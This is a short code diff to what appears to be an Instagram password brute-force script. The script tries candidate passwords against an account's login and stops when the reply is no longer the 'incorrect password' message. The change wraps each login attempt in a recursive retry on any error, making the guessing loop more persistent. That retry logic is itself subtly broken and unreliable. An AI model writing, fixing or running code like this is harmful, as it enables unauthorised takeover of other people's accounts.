@@ -116,7 +116,10 @@ class Instagram():
                 continue
             self.current_trying = password
             def test(passw):
-                try_ = self.login(passw)
+                try : 
+                    try_ = self.login(passw)
+                except Exception:
+                    test(passw)
                 if try_["message"] != "Sorry, your password was incorrect. Please double-check your password.":
                     print(try_)
                     exit()
